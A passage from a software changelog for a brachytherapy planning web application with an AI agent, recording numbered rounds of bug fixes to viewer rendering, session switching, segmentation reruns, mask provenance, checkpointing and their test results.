  authentication, and workspace scripts.
- The focused regression suite includes the new contour scope/color contract;
  the full suite remains the release gate on the configured Python/conda
  runtime.

## Round 74: Needle endpoint interaction runtime error (2026-07-21)

### Confirmed finding

The reported browser error was a real deterministic defect:

```text
Uncaught ReferenceError: requestRender is not defined
  at _setNeedleInternalHandleHover (...brachybot-viewer-layout.js)
```

`_setNeedleInternalHandleHover()` and `setNeedleInteractionHighlight()` are
module-level helpers. They were calling `requestRender`, which is a closure
created inside `init3DScene()` and therefore is not visible at those call
sites. The exception occurred during endpoint hover/press/release cleanup and
left the pointer interaction in a wait-like state. This was not a GPU timeout,
an RL planning loop, or a coordinate-chain error.

### Corrective changes

- Route those helpers through the public `scene3D.requestRender()` scheduler,
  with a defensive scene/initialization check.
- Keep the capture-phase endpoint guard, press-and-hold activation delay,
  explicit replan confirmation, and outside-click context-menu behavior
  unchanged.
- Render the 3D shaft from the same deepest-seed-clipped geometry used by the
  endpoint handles and 2D overlays.
- When the intrabody endpoint is edited, move the deepest associated seed with
  it so the visible seed/needle relationship remains physically consistent.
- Bump frontend asset versions so a running browser cannot reuse the stale
  script containing the undefined call.

### Additional durable workflow work in this round

- Added post-review `final_text_chunk` SSE events. Draft provider chunks stay
  in the execution trace; one answer bubble is progressively filled only after
  the review gate, then finalized by the authoritative `response` event.
- Added case-owned audit-event and review-comment storage/API endpoints.
- Added read-only DICOM-RTSTRUCT/RTDOSE metadata import. Registration and
  rasterization remain explicit operator decisions.
- Added a human-review queue for clinical knowledge-base contributions and
  source candidates; queued material cannot affect retrieval before approval.

### Verification

- `node --check` passes for all changed frontend JavaScript files.
- `git diff --check` passes.
- The focused remote regression suite is the release gate for the Python
  runtime and covers the endpoint render scheduler, clipped geometry, reviewed
  streaming response, workspace ownership, and review-comment persistence.

## Round 75: Deploy-safe endpoint rendering and complete case review UI (2026-07-21)

### Confirmed findings

- A browser console captured repeated `requestRender is not defined` errors
  from `brachybot-viewer-layout.js?v=7` and
  `brachybot-3d-manual.js?v=13`. The current source already routes module-level
  helpers through `scene3D.requestRender`, but an open tab can retain an older
  static revision across a deployment. That exception aborts pointer cleanup
  and makes a selected needle endpoint appear to spin or hang indefinitely.
- DICOM-RT import, server audit events, and case review comments had durable
  backend contracts, but the operator could not use those workflows from the
  normal Input and Report panels. The agent UI catalog could not invoke them
  either.
- Returning the complete RTSTRUCT object after import would send every contour
  coordinate to the browser even though the browser only needs provenance and
  counts before registration. Large structure sets could therefore delay case
  restoration. A malformed legacy checkpoint could also leave the stored
  import collection as a non-list value.

### Corrective changes

- Keep all current endpoint helpers on the scene-owned render scheduler and
  expose the initialized scheduler as a temporary `window.requestRender`
  compatibility bridge. The 3D asset version was incremented so a refreshed
  tab receives the corrected implementation, while a mixed-revision tab does
  not fail on the older global lookup.
- Added a bilingual, case-scoped DICOM-RT picker and status surface to Input.
  RTSTRUCT/RTDOSE metadata is persisted in the selected workspace; UI restore
  is session-fenced and does not block CT/mesh hydration. The status explicitly
  states that registration is unconfirmed and no planning data was replaced.
- Added Report dialogs for the server audit trail and multidisciplinary review
  comments. Comments support add, resolve, and reopen operations, inherit the
  existing accessible modal close/focus behavior, and show immediate loading
  and error feedback.
- Added explicit UI-controller targets for CT, CTV, OAR, and DICOM-RT file
  pickers plus the case-review dialog. Browsers still require the operator to
  choose a local file; the agent can only open the same visible picker.
- DICOM-RT API responses now use compact summaries. Full contour coordinates
  remain in the owned server checkpoint, while the browser receives structure,
  contour, and point counts. Legacy non-list import state is normalized before
  appending a new record.

### Verification

- Browser DOM smoke test confirms the Input DICOM-RT picker, Report review
  control, and current versioned viewer assets are present. No application
  console errors were emitted during page load.
- `node --check` passes for the modified UI, Report, and 3D viewer scripts.
- Focused remote regression suite: `16 passed, 3 warnings`.
- Full configured-runtime suite: `235 passed, 2 skipped, 3 warnings`.
- `git diff --check` passes; the remaining messages are only Git's configured
  LF/CRLF working-tree normalization notices.

## Round 76: Responsive session control-plane transitions (2026-07-22)

### Confirmed findings

- New-case, case-switch, and case-delete handlers waited serially for UI
  snapshot persistence, lease release/acquisition, and server-side list
  reconciliation. These operations are control-plane work and did not need
  to block the first visible state of the selected case.
- Switching cases synchronously disposed every previous Three.js geometry and
  material. Large OAR/CTV reconstructions could therefore block the browser
  main thread before the new empty or restored case could paint.
- Deleting a case synchronously flushed a cached BrachyAgent checkpoint. That
  can serialize CT, masks, dose arrays, and plan state even though the user
  explicitly requested deletion. A pending debounce checkpoint could also
  recreate a deleted workspace after the delete response.
- UI snapshot persistence called the general `get_agent()` callback, which
  could hydrate a cold Agent during a harmless viewer/session-state save.

### Corrective changes

- Session transitions now paint the new active case without awaiting old-case
  persistence or lease round trips. Lease release/acquisition and session-list
  reconciliation continue in the background and remain case-scoped.
- Old WebGL objects are removed synchronously so they cannot bleed into the new
  case; geometry/material disposal is deferred to the next frame. A generation
  fence still prevents late mesh or viewer callbacks from repainting an older
  case.
- Added a cached-agent lookup for UI snapshot persistence. It updates an
  already resident Agent when present, but never constructs or hydrates one for
  a control-plane save.
- Delete/purge uses a fast cache drop and cancels pending checkpoint timers
  before moving/removing the workspace. The durable snapshot remains the
  source of truth for the explicitly deleted case, while another active case
  and its task are not cancelled.
- Bumped the `brachybot-ui-api.js` and `brachybot-workspace.js` asset query
  versions so an already-open browser cannot silently retain the pre-fix
  transition code.

### Verification

- Focused workspace/auth regression suite: `49 passed, 3 warnings`.
- Full configured-runtime suite: `243 passed, 2 skipped, 3 warnings`.
- `node --check` passes for the modified workspace and UI API scripts.
- Python compilation and `git diff --check` pass.

## Round 77: Visible background workspace hydration (2026-07-22)

### Confirmed finding

- The lightweight session switch was intentionally non-blocking, but the
  subsequent CT/mesh/dose/viewer restore was visually silent. During a long
  restore the user could see the new chat shell while receiving no indication
  that clinical resources were still loading.

### Corrective changes

- Added a non-blocking, localized workspace hydration notice with a subtle
  spinner. It appears during reconnect restoration and background case
  hydration, while chat and other lightweight controls remain usable.
- The notice is cleared on successful completion, cancellation, case
  supersession, and restore failure. Its animation respects
  `prefers-reduced-motion` and does not reuse the error/lock presentation.
- Bumped the UI API, workspace script, and auth stylesheet asset versions so
  browsers cannot retain the pre-notice static assets.

### Verification

- Workspace frontend regression suite: `37 passed`.
- Full configured-runtime suite after this change: `244 passed, 2 skipped, 3 warnings`.
- JavaScript syntax and `git diff --check` pass.

## Round 78: Request-scoped Progress and stale overlay isolation (2026-07-22)

### Confirmed findings

- The frontend Progress dock seeded a fixed CTV -> OAR -> planning template
  whenever a message mentioned a tumor site and an execution verb. Therefore
  a request such as "execute OAR segmentation" could correctly call only
  `oar_segmentation` while still displaying a pending planning pipeline. This
  was a real presentation-contract defect; the backend had not executed the
  planning tool.
- Workspace transitions cleared `state.doseOverlay`, but asynchronous dose
  metadata/slice requests and preload timers remained alive. A late response
  could repaint an old dose into the newly selected case.
- Detached chat finalization relied on the aggregate `response` event. If a
  provider or connection ended after reviewed `final_text_chunk` events but
  before that aggregate event, the answer could be absent from the durable
  transcript even though the user had received streamed text.
- The shared upload progress element lived in the CT form row, so CTV/OAR
  uploads displayed activity beside the wrong input.

### Corrective changes

- `_todoSeed()` now distinguishes segmentation-only requests from planning
  requests. Tumor-site words are context, not permission to show planning;
  planning is seeded only when a planning action is explicitly present. This
  preserves the existing full planning preview and does not alter tool
  routing.
- Added `clearDoseOverlayRuntime()` and invoke it before client workspace
  reset. It increments the request fence, aborts active slice requests,
  clears in-flight/preload state, hides dose canvases/colorbars, and requests
  one clean render.
- `ChatTask` now accumulates reviewed streamed text as a fallback. Durable
  finalization uses the aggregate response when present and the streamed text
  otherwise, while the normal single-response path remains unchanged.
- Upload progress is moved to the active form row and labels the target as CT
  image, CTV mask, or OAR mask.
- Unknown OAR labels remain explicitly unmapped, OAR Vx is normalized through
  one bounded fraction contract, trained-dose recomputation reuses immutable
  model/seed caches, and report figure capture continues to exclude endpoint
  handles from publication images.

### Verification

- Python AST parsing passes for all modified backend and planning modules.
- `node --check` passes for all frontend JavaScript assets.
- Added a regression assertion that segmentation-only Progress seeding cannot
  include `planning_pipeline`.
- Remote configured-runtime suite: `245 passed, 2 skipped, 3 warnings`.
- Remote focused Progress/chat/workspace suite: `22 passed, 3 warnings`.
- This revision is published only after both suites passed.

## Round 79: Explicit Re-execution Overrides State Reuse (2026-07-22)

### Confirmed findings

- The reuse guard was correct for accidental duplicate segmentation, but it
  was effectively absolute in some LLM and fallback paths. A user who had
  already seen a result and explicitly requested another model run could be
  told that rerunning was unnecessary, which contradicted the completed tool
  action.
- Generic repeat segmentation was not scope-stable: after an OAR request, a
  generic "run segmentation again" could broaden into CTV plus OAR.
- Direct tool failures were marked `done` in one execution path. An empty CTV
  could therefore be rendered as a successful prerequisite and mislead final
  response synthesis.
- The rule-based fallback used a separate registry execution path, so it did
  not consistently carry the explicit override flag or the same downstream
  invalidation behavior.

### Corrective changes

- Added a shared explicit-reexecution detector for Chinese and English
  requests, including rerun, overwrite, ignore-existing, and re-plan wording.
  This only bypasses state reuse; it does not bypass model validation,
  coordinate checks, obstacle checks, or clinical safety gates.
- Added case-local segmentation scope resolution. Explicit CTV/OAR requests
  win; a generic repeat inherits `last_segmentation_target`; only an explicit
  request for both expands the scope.
- Propagated `force_reexecution` through CTV/OAR schemas, direct tool calls,
  the LLM hard-block filter, and rule-based fallback handlers.
- A successful forced segmentation replaces the active node and clears all
  dependent plan products. A failed run leaves the last reviewed result intact
  but is reported with an error status; empty CTV remains a hard planning
  prerequisite failure.
- Final synthesis receives an execution contract for forced runs: it must not
  recommend against the requested rerun and must not claim an error step
  succeeded.
- Updated planning/system prompts and added regression coverage for explicit
  overrides, inherited scope, and truthful failure status.

### Verification

- Local Python compilation passes with the repository-independent interpreter
  invocation; `git diff --check` passes.
- Remote focused suite: `60 passed, 2 skipped, 3 warnings`.
- Remote full configured-runtime suite: `249 passed, 2 skipped, 3 warnings`.

## Round 80: Manual Label Orientation Matches the CT Viewer (2026-07-22)

### Confirmed finding

- The manual CTV/OAR upload route correctly rejected labels with a different
  source CT grid, but the route only compared their *raw* geometry. The viewer
  subsequently reorients CT images to LPI while a manually supplied label was
  kept in its source orientation. A CT whose source direction reverses the
  axial axis could therefore pass geometry validation yet display the uploaded
  mask in the wrong axial position in a new case.

### Corrective changes

- Manual CTV and OAR label imports now apply the same LPI reorientation as the
  CT viewer before their arrays and mask objects enter planning memory.
- This is not a resample: the existing raw-grid validation remains the guard
  against mismatched CT/mask datasets, and `SimpleITK.DICOMOrient` only
  reindexes the validated label into the common viewer orientation.
- The imported-result metadata records `manual_label_orientation: LPI` for
  transparent provenance.

### Verification

- Added a regression with an asymmetric label volume and reversed Z direction.
  It proves that manual CTV and OAR arrays exactly equal the viewer-LPI form of
  the source label.
- Python compilation and `git diff --check` pass locally.
- Remote targeted regression: `2 passed, 72 deselected, 3 warnings`.
- Remote full configured-runtime suite: `250 passed, 2 skipped, 3 warnings`.

## Round 81: Viewer Display-State and Report Capture Consistency (2026-07-22)

### Confirmed findings

- The 2D dose canvas cache was keyed effectively by slice index only. After a
  dose-scale change, canvas resize, dose replacement, or session transition,
  the same slice could be treated as already rendered and retain stale pixels.
- Dose Surface applied fixed CTV/OAR opacity and visibility values. That
  overwrote Data Tree choices and could make a user believe that the viewer
  ignored the Data Tree.
- Restoring Normal Surface revived material snapshots without re-reading the
  current Data Tree state, so changes made while Dose Surface was active could
  be lost.
- Figure 1 framing included large remote OAR structures and full needle extent,
  making the plan and seed close-up too small to inspect. Endpoint handles were
  also vulnerable to being captured when the scene rebuilt during capture.
- The tumor-type selector exposed implementation names such as nnU-Net and
  VoCo, even though the user only needs a tumor type and its availability.

### Corrective changes

- Added a dose-overlay render epoch. Colorbar application, dose metadata
  replacement, session canvas clearing, and canvas resizing invalidate the
  epoch. Async slice callbacks must match both the current slice and epoch
  before painting. All three 2D viewers are refreshed after a 2D colorbar
  change.
- Made `dataTreeState` the canonical source for mesh visibility, opacity, and
  normal-surface color. Dose Surface now reads those values and no longer
  forces fixed opacity or visibility. Normal Surface re-applies the current
  Data Tree state after material restoration.
- Color changes for isodose surfaces update the 3D material and trigger the
  existing 2D label/contour refresh path. Dose mode preserves user-selected
  normal colors for the subsequent restore.
- Report Figure 1 now frames around the CTV, seeds, and nearby OAR context.
  The detail view prioritizes tumor and seed distribution, uses a larger
  composite canvas, and excludes full needle extent from its framing.
  `__reportCaptureActive` hides interaction endpoint handles for the complete
  capture transaction and the viewer state is synchronized after restoration.
- The selector now shows tumor types only, marks available entries green and
  unavailable entries red, and gives localized user-facing guidance for
  uploading a matching CTV mask.
- Static asset versions were bumped so deployed browsers cannot retain the
  previous viewer code from cache.

### Verification

- `node --check` passed for all changed frontend JavaScript modules.
- `git diff --check` passed.
- Remote configured-runtime regression suite:
  `tests/test_workspace_frontend.py` plus
  `tests/test_viewer_safety_geometry.py`: **43 passed, 3 warnings**.
- The clinical coordinate chain, dose-engine model, and planning algorithm were
  not changed in this round.
- Detailed implementation notes are recorded in
  `docs/VIEWER_RENDERING_AND_REPORT_FIXES_2026-07-22.md`.

## Round 82: Clear Mask Inputs on Case Reset (2026-07-22)

### Confirmed finding

- Creating a new case cleared the CT input and clinical viewer state but left
  the previous case's CTV/OAR path fields and native file selections in the
  Input panel. This was a UI state-isolation defect, not a mask-processing or
  coordinate defect.

### Corrective changes

- The shared `resetAllState()` path now clears case-owned `ctvPath` and
  `oarPath` values, their visible text inputs, and the `fileCTV`/`fileOAR`
  selections. This path is used by new-case creation, case switching, and CT
  replacement, so all three entry points have the same isolation behavior.
- Static asset versioning was incremented so the browser cannot retain the
  previous form-reset code.

### Verification

- Added a frontend regression assertion for both mask path fields and both
  native file inputs.
- Existing remote workspace/viewer suite remains the required validation gate;
  no clinical coordinate or planning logic was changed.

## Round 83: Incremental Needle Replanning and Report Delivery Progress (2026-07-22)

### Confirmed findings

- A dragged needle was sent through the manual DoseUNet endpoint with every
  seed eligible for reprojection. The reprojection loop also rewrote seeds on
  unchanged trajectories, which invalidated their position/direction cache
  keys. Consequently, a one-needle edit could degrade into full-plan seed
  inference and take longer than the original planning run.
- The browser then called `refreshPlanningUI()`. That function is intentionally
  broad: it reloads masks, all OAR/CTV meshes, dose metadata, report figures,
  and the complete 3D scene. It was correct for a completed planning tool, but
  was the wrong postcondition for a local needle edit.
- The final response trace could mark the model call complete before the
  authoritative response had finished streaming, leaving a visible period in
  which all displayed steps were done while the answer was still being built.
- Figure 1 detail framing could crop part of the CTV, and Figure 2 dose-surface
  capture could accept a black WebGL frame when the renderer had not completed
  its first visible render.

### Corrective changes

- Reprojection now compares old and new endpoint pairs and changes only the
  affected trajectory IDs. Unchanged seed coordinates and directions remain
  byte-stable for cache reuse.
- Manual dose recomputation now uses the previous reliable AI dose field as a
  baseline, subtracts only the old affected-trajectory seed maps, and adds the
  new affected-trajectory maps. The same trained `dose_unet_spacing1mm`
  model remains the only dose engine; this is an incremental composition of
  model outputs, not an analytical fallback. If the baseline is unavailable or
  its grid is incompatible, the code deliberately falls back to the complete
  model computation.
- The manual endpoint returns authoritative post-reprojection seeds and
  needles. The browser updates those objects, DVH, metrics, dose overlay,
  current slices, and active dose texture without rebuilding unrelated meshes
  or report figures.
- The execution trace now exposes `Response Synthesis` and `Final Response`
  phases, so a response remains visibly pending until it has actually been
  delivered to the chat stream.
- Figure 1 detail padding was widened to keep the complete CTV and peripheral
  seeds in frame. Figure 2 dose-surface capture now renders twice, samples the
  WebGL framebuffer, rejects an unlit black frame, and retries after the scene
  is visibly ready. Nearby dose-texturable anatomy is retained for context.

### Verification

- `py_compile` passed for the modified Python modules and regression tests.
- `node --check` passed for the modified manual-viewer, chat, and report
  modules.
- `git diff --check` passed.
- Added regression contracts covering changed-trajectory filtering,
  incremental manual dose composition, compact viewer refresh, final-response
  trace phases, and non-black report capture.
- Bumped the changed chat, manual-viewer, and report-editor asset revisions;
  the stale Round 7 cache-busting assertion was updated to the deployed
  revisions instead of preserving an obsolete version number.
- Remote configured-runtime tests are the final gate before publication; the
  report will be amended with their exact result after the remote run.

## Round 84: Bound Single-Needle Replanning After Workspace Restore (2026-07-22)

### Confirmed finding

- The stable-`needle id` matching introduced for incremental replanning was
  followed by an unconditional symmetric-difference update of the raw
  `trajectory_id` sets. A workspace restore can legitimately rename those
  association labels while preserving the physical needle geometry. The final
  update therefore reclassified every restored needle as changed, causing a
  one-needle edit to re-infer the complete seed plan. This is a real latency
  defect and can explain multi-thousand-second interactive replans; it is not
  evidence that the dose model needs to run on CPU.

### Corrective changes

- Stable needle IDs are now authoritative whenever at least one old/new ID
  pair matches. Raw trajectory-ID differences are used only as the legacy
  fallback when no stable IDs are available.
- The manual dose path logs the changed association keys and old/new needle
  counts, making accidental full-plan invalidation diagnosable in the server
  log.
- Interactive needle replanning retains a positive deadline controlled by
  `BRACHYBOT_MANUAL_REPLAN_TIMEOUT_S` (default 180 seconds). The trained
  DoseUNet inference checks this deadline between sliding-window passes and
  returns a clear retryable failure instead of leaving the request unbounded.
- The previous automatic plan's per-seed AI dose maps are reused when their
  grid matches. Only the edited trajectory's old contribution is removed and
  its new contribution is inferred; the full model path remains the explicit
  compatibility fallback when the baseline is unavailable.

### Verification

- Remote targeted viewer/workspace/replanning suite: **66 passed, 3 warnings**.
- Remote complete suite: **262 passed, 3 warnings**.
- Local Python and JavaScript syntax checks and `git diff --check` passed.
- The remote working tree contains the exact tracked blobs from the validated
  local commit. The currently running Python server process must be restarted
  before it can import the updated backend module; an already running request
  cannot be retroactively shortened.

## Round 85: Uploaded Mask Provenance and Batch OAR Reconstruction (2026-07-23)

### Confirmed findings

- Uploaded OAR label volumes were previously allowed to inherit the
  TotalSegmentator numeric ontology. A label value such as `1` or `7` is not
  sufficient evidence that the uploaded file contains liver, vertebrae, or any
  other named anatomy. This could create false anatomical names in the Data
  Tree and could incorrectly affect traversability decisions.
- Manual CTV/OAR replacement did not consistently clear model-only sidecars
  (`ctv_full_labels`, embedded OAR labels, and previous OAR names/counts), so a
  new mask could be displayed with stale structures from the previous result.
- The natural-language command to reconstruct all OAR masks was not routed as
  a deterministic UI action in the affected runtime path. In addition, the
  group reconstruction handlers treated an empty client-side Data Tree as a
  successful no-op when label metadata was still loading. This explains why
  manual uploads could be visible in 2D but fail to produce 3D meshes.

### Corrective changes

- Uploaded OAR masks now carry `uploaded_unknown` provenance and receive stable
  numbered names (`OAR 1`, `OAR 2`, ...). They default to the traversable OAR
  group. No anatomical name is inferred from an integer label. Model-produced
  masks retain their authoritative model label map; TotalSegmentator mapping is
  used only when the provenance explicitly identifies that model.
- Uploaded CTV masks use the selected tumor type for the foreground label and
  remain opaque user CTV data. Model-only multi-label CTV sidecars are cleared
  and are not merged into a later uploaded CTV. OAR names, counts, source, and
  provenance are replaced atomically when an OAR mask is changed.
- Viewer and report/DICOM naming use the same provenance-gated name helper, so
  the Data Tree, exported structures, and report cannot silently disagree.
- Explicit requests such as “reconstruct all OAR masks in 3D” now route to
  `tree.group.reconstruct3d` with value `oar`. Both chat-driven and manual group
  reconstruction hydrate `/api/viewer/organs` when necessary, then reconstruct
  every current OAR label independently. A single malformed label no longer
  prevents the remaining valid meshes from rendering, and an empty result is
  reported to the user instead of being marked done.

### Verification

- Python syntax checks passed for all changed backend/tool modules.
- Node syntax checks passed for the changed UI action, viewer layout, and
  volume modules.
- `git diff --check` passed.
- Added `tests/test_uploaded_mask_provenance.py` covering numbered uploaded OAR
  names, provenance-gated ontology lookup, and selected-tumor-type CTV naming.
- Added frontend contracts covering metadata hydration and asynchronous batch
  reconstruction.
- Remote complete suite: **264 passed, 2 skipped, 3 warnings**.
- Remote `main` was published at `450f83cb`; the active Python server process
  must be restarted before it imports these backend changes.

## Round 86: Reliable OAR Tree Recovery and Immediate Case Switching (2026-07-23)

### Confirmed findings

- A restored `/api/viewer/label_volume` payload can contain valid OAR voxels
  while its optional `X-Organ-Meta` response header is absent, malformed, or
  stripped by an intermediary. The 2D viewers therefore rendered the masks,
  but the browser had no names/counts with which to rebuild `dataTreeState`.
  The OAR node then appeared empty even though the same session visibly had
  OAR overlays.
- The browser waited for the session selection request before replacing the
  current viewer, chat, title, and sidebar state. Although server-side
  selection intentionally avoids agent/GPU hydration, a slow snapshot request
  still made a normal session click appear unresponsive and encouraged stale
  previous-case content to remain visible.

### Corrective changes

- The 2D label loader now treats the binary label data as authoritative for
  pixel rendering and uses `/api/viewer/organs` as a same-session metadata
  fallback whenever OAR labels arrive without usable metadata. It verifies the
  viewer generation and selected session before applying results, preserves
  existing Data Tree material/category settings, and re-renders the tree only
  for the currently selected case.
- Session selection now performs an optimistic control-plane paint: it clears
  the old case, immediately highlights the selected session, updates the title
  and chat shell, and shows an opening-resource state before requesting the
  durable snapshot. CT, label arrays, dose, meshes, and Agent hydration remain
  background work. A failed selection restores the prior shell instead of
  leaving a phantom selected session.
- Incremented the two affected static asset revisions so an already-open
  browser cannot retain the prior workspace or label-loader implementation
  from its HTTP cache.

### Verification

- Node syntax checks passed for `brachybot-workspace.js` and
  `brachybot-viewer-volume.js` on the local development machine.
- Added frontend regression contracts for optimistic session painting and the
  OAR metadata fallback.
- Remote targeted workspace frontend suite: **41 passed**.
- Remote complete suite: **266 passed, 2 skipped, 3 warnings**.

---

## 2026-07-25 — Session-switch bounce-back: optimistic shell paint reverted on server error

### Confirmed issue

Clicking a session in the sidebar briefly highlighted the new session,
then snapped back to the original.  The optimistic `paintSessionShell(id)`
update changed `activeSessionId` and cleared the viewer BEFORE the server
confirmed the switch.  When the server returned an error (timeout, auth
expiry, stale CSRF token), the catch block called
`paintSessionShell(previousSessionId)`, producing the visible bounce.

### Root cause

`brachybot-workspace.js:935` called `paintSessionShell(id)` before
`workspaceFetch('/api/sessions/<id>/select')`.  Lines 943 and 948
recovered by painting the previous session's shell.

### Resolution

- Moved the full UI update (activeSessionId, renderSessionList,
  loadSessionChat, clearClientWorkspace) AFTER server confirmation.
- Show a lightweight "Switching case…" spinner before the round-trip.
- Error paths only hide the spinner; no bounce-back recovery.
- `persistWorkspace('session.switching')` is now awaited (with catch)
  so the server snapshot is up-to-date when `applyWorkspaceSnapshot`
  overwrites `sessions[id].messages`.

### Verification

- `node --check` passed for `brachybot-workspace.js`.

---

## 2026-07-25 — Detached bot responses and thinking chains lost on session switch

### Confirmed issue

Switching sessions while the bot was still responding left only the
user's command visible — the bot's answer, thinking chain (Execution
Trace), and usage-bar footer (Time / Tokens / Tools) were all missing
when returning to that session.

### Root cause

`sendChat` returns early at line 1840 when `activeSessionId` has
changed, skipping the save of `'bot-response'` and `'thinking'`
messages into `sessions[id].messages`.  The catch block at line 1974
had the same gap for AbortError.  Additionally, `applyWorkspaceSnapshot`
unconditionally overwrote `sessions[id].messages` with the server
snapshot, which could be stale.

### Resolution

1. Both the normal loop-exit and the AbortError catch-block paths now
   save the completed response (`saveSessionMessage('bot-response', …)`)
   and thinking chain (`saveSessionMessage('thinking', '', steps, …)`)
   before returning when detached.
2. `applyWorkspaceSnapshot` compares the snapshot message count with the
   local copy; if the browser has MORE messages, the local copy is kept.
3. `saveSessionMessage` accepts an optional `meta` argument (llm_meta,
   toolCount, elapsedSec).  `finalizeStreamingResponse` and both detach
   save paths pass it.
4. `loadSessionChat` calls `_appendRestoredFooter` for bot-response
   messages with saved meta, reconstructing the usage-bar footer.

### Verification

- Node syntax check passed for `brachybot-chat-todo.js` and
  `brachybot-chat-core.js`.

---

## 2026-07-25 — SSE idle timeout expired during long LLM thinking phases

### Confirmed issue

Asking "请生成报告" triggered an LLM thinking phase lasting 184 s.
The SSE idle timeout (90 s for non-planning turns) fired, the
AbortController aborted the fetch, and the error produced
`"Send failed: signal is aborted without reason"`.

### Root cause

`readChatChunk` in `sendChat` used `CHAT_PLANNING_IDLE_TIMEOUT_MS`
(900 s) only when active/pending todo items existed.  An LLM thinking
phase with no tool calls created no todo items, so the default 90 s
timeout applied.

### Resolution

Dynamic timeout now also considers live `steps`: any step with
`status: 'active'` or `status: 'pending'` extends the timeout to
`CHAT_PLANNING_IDLE_TIMEOUT_MS`.  The error handler falls back to
`window._sessionChatTaskIds[turnSessionId]` when the turn-level
`task_id` from `task_meta` is missing.

### Verification

- Node syntax check passed for `brachybot-chat-todo.js`.

---

## 2026-07-25 — Agent checkpoint silently lost planning results after restart

### Confirmed issue

After a page refresh or server restart, previously completed planning
results (dose_metrics, seed_plan, CTV/OAR arrays) were missing from
the agent's memory.  The bot reported "planning not done" and the
frontend showed no masks, seeds, or needles.

### Root cause

`finalize_chat_task` used `schedule_agent_checkpoint` (0.75 s debounced
timer) to persist the agent's planning results.  If the checkpoint
write failed (disk full, I/O error), `_checkpoint_timer` silently
swallowed the exception (`except Exception: pass`).  After a restart,
`hydrate_agent` restored only the chat transcript from the snapshot;
the planning arrays were absent because the checkpoint timer never
committed them.

### Resolution

1. `_checkpoint_timer` now logs the full traceback (`logger.warning(…, exc_info=True)`) on failure.
2. `_commit_agent_snapshot` catches `WorkspaceNotFound` (deleted session)
   and gracefully discards sidecar arrays instead of raising.
3. Changed `finalize_chat_task` to use `flush_agent_checkpoint` (synchronous)
   then back to `schedule_agent_checkpoint` (debounced) after adding error
   logging, so the chat response is not blocked by large array I/O.

### Verification

- `py_compile` passed for `workspace_store.py` and `planning_routes.py`.

---

## 2026-07-25 — CT volume and label volume transfer: gzip compression

### Confirmed issue

`/api/viewer/volume` returned raw `int16` binary without compression.
A typical CT volume (48 × 512 × 512, ~25 MB) was transferred
uncompressed, slowing session restore and CT loading.

### Resolution

Both `/api/viewer/volume` and `/api/viewer/label_volume` now check
`Accept-Encoding: gzip` and compress the response body with
`gzip.compress(compresslevel=4)`.  The browser's native `fetch` API
automatically decompresses gzip responses.

### Verification

- `py_compile` passed for `viewer_routes.py`.

---

## 2026-07-25 — Duplicate Execution Trace on task resume after session switch

### Confirmed issue

Switching sessions mid-planning and returning produced two copies of
the "Execution Trace" progress dock — one live and one stale.

### Root cause

`createLiveThinkingChain` created a new DOM element with id
`liveThinkingChain` without removing the previous one.  The detach
path left the old chain in the DOM because it was never finalized.

### Resolution

`createLiveThinkingChain` now checks for and removes any existing
`#liveThinkingChain` element (including its setInterval timer)
before creating the new chain.

### Verification

- Node syntax check passed for `brachybot-chat-core.js`.

---

## 2026-07-25 — Hydration notice ("Switching case…" / "Opening case…") redesigned

### Confirmed issue

The workspace hydration notice appeared at `top: 58px; right: 18px` —
a small, easily-missed spinner in the top-right corner with no
backdrop or exit animation.

### Resolution

- CSS: Notice centred at `top: 50%; left: 50%; transform: translate(-50%, -50%)`.
- Enlarged: padding `14px 24px`, font `14px`, spinner `16px`, min-width `220px`.
- Backdrop: `body.workspace-hydrating::after` with semi-transparent overlay.
- Entrance: springy pop-in (`cubic-bezier(0.34, 1.56, 0.64, 1)`) 260 ms.
- Exit: smooth pop-out animation 180 ms, JS `animationend` handler sets `hidden`.
- `setWorkspaceHydrationState` cancels in-progress animations on re-show.

### Verification

- Node syntax check passed for `brachybot-workspace.js`.
- CSS changes verified with diff on `brachybot-auth.css`.

---

## 2026-07-25 — Session switch stutter: sidebar frozen, no feedback, clicks dropped

### Confirmed issue

Rapid session-hopping produced visible stutter: the sidebar dimmed
(`pointer-events: none`) during every transition, so the user could
not click another session until the current transition completed.
If the server was slow (network lag, large snapshot JSON), the sidebar
remained frozen for 15+ seconds with no way to recover.

### Root cause

1. `body.workspace-transitioning #sessionList { pointer-events: none }`
   silently dropped every click during a transition.
2. `persistWorkspace` was awaited, blocking the transition for up to
   15 s while uploading a potentially large payload (report with
   base64 screenshots).
3. No mechanism to abort a stuck transition — the old version simply
   rejected busy transitions with `{ busy: true }`.

### Resolution

1. Removed `pointer-events: none` from `#sessionList` during
   transitions; the sidebar remains clickable (dimmed via
   `opacity: 0.58`).
2. `persistWorkspace` is now fire-and-forget (`void`) — local message
   protection in `applyWorkspaceSnapshot` guards against stale
   snapshots.
3. Spinner is shown immediately (before any async work) for instant
   visual feedback.
4. AbortController chains: when a new click arrives while a transition
   is in progress, `_switchAbortController.abort()` kills the
   in-flight fetch, and the new target is queued.  The old transition
   bails out immediately instead of waiting for the 15 s timeout.
5. `workspaceFetch` chains an external signal with the internal
   timeout so both triggers can cancel the fetch.

### Verification

- Node syntax check passed for `brachybot-workspace.js`.
- CSS diff verified in `brachybot-theme-layout.css`.

---

## 2026-07-25 — Data Tree opacity slider too small to grab and drag

### Confirmed issue

The opacity `<input type="range">` controls in the Data Tree had a
track height of only 3 px, making them extremely difficult to click
and drag.  Dragging frequently lost grab because the thin track offered
almost no hit area.

### Resolution

Track hit-area enlarged from 3 px to 12 px.  The visible 3 px track is
rendered via a `::before` pseudo-element so the visual appearance is
unchanged while the clickable region is 4× larger.  Added
`cursor: pointer`.

### Verification

- CSS diff verified in `brachybot-report-controls.css`.

---

## 2026-07-25 — Debounced agent checkpoint fired after session deletion

### Confirmed issue

Server log showed repeated warnings:
`Agent checkpoint failed for session … WorkspaceNotFound`.

### Root cause

When a session was deleted, the debounced checkpoint timer (0.75 s)
could fire after the session row was removed from the database.
`_commit_agent_snapshot` → `load_snapshot` → `get_session` raised
`WorkspaceNotFound`, and the previously silent `except Exception: pass`
was now logging it as a warning.

### Resolution

`_commit_agent_snapshot` catches `WorkspaceNotFound` specifically,
discards the prepared sidecar arrays, and returns an empty dict.
`_checkpoint_timer` silently ignores `WorkspaceNotFound` (expected
after deletion) and only logs true I/O exceptions as warnings.

### Verification

- `py_compile` passed for `workspace_store.py`.

---

## 2026-07-25 — Browser-side IndexedDB cache for session restore

### Confirmed issue

Switching back to a previously loaded session re-downloaded the entire
CT volume (50–100 MB Int16Array), 3D mesh geometry (5–15 MB JSON), and
label volumes (5–20 MB) from the server on every switch.  No client-side
